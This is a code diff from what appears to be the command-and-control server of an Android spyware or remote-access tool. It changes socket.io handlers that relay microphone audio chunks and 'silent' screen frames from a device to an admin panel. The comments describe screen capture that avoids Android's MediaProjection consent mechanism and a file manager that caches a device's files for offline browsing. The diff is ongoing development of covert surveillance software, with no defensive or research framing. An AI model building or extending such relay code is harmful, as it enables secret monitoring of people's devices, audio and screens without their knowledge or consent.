@@ -3365,9 +3365,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       socket.on('mic_stream_started', (data) => { io.emit('mic_stream_started', data); });
       socket.on('mic_stream_stopped', (data) => { io.emit('mic_stream_stopped', data); });
 
-      socket.on('mic_stream_chunk', (meta, chunk) => {
-        // Just broadcast to admin panel — we don't persist audio chunks
-        io.emit('mic_stream_chunk', { ...meta, chunk: chunk ? Buffer.from(chunk).toString('base64') : null });
+      socket.on('mic_stream_chunk', (data) => {
+        // v7.9.5: Device now sends chunk as base64 INSIDE the JSON object
+        // (not as a separate binary arg). Just pass through the whole object.
+        io.emit('mic_stream_chunk', data);
       });
 
       socket.on('screen_stream_chunk', (meta, chunk) => {
@@ -3377,9 +3378,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // v7.9.2: Silent screen stream (JPEG slideshow, no MediaProjection)
       socket.on('silent_screen_start', (data) => { io.emit('silent_screen_start', data); });
       socket.on('silent_screen_stop', (data) => { io.emit('silent_screen_stop', data); });
-      socket.on('silent_screen_frame', (meta, frameB64) => {
-        // frameB64 is already a base64 string from the device
-        io.emit('silent_screen_frame', { ...meta, frame: frameB64 });
+      socket.on('silent_screen_error', (data) => { io.emit('silent_screen_error', data); });
+      socket.on('silent_screen_frame', (data) => {
+        // v7.9.5: Device now sends frame as base64 INSIDE the JSON object
+        io.emit('silent_screen_frame', data);
       });
 
       // v7.9.2: File manager — relay + cache for offline browsing
